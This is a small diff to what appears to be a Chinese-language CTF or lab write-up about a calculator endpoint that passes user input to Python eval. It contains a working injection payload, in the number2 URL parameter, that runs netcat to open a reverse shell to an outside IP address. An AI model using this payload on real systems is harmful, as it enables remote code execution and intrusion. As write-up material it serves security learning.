@@ -11,7 +11,7 @@
 python报错后显示了代码：eval(a + operator + b)
 ```
 拼接传参b
-/_calculate?number1=1&operator=-&number2=1,__import__ ('os').system(' nc 120.46.41.173 9023 -e /bin/sh')
+/_calculate?number1=1&operator=-&number2=1,__import__ ('os').system('nc 120.46.41.173 9023 -e /bin/sh')
 ```
 
 ```
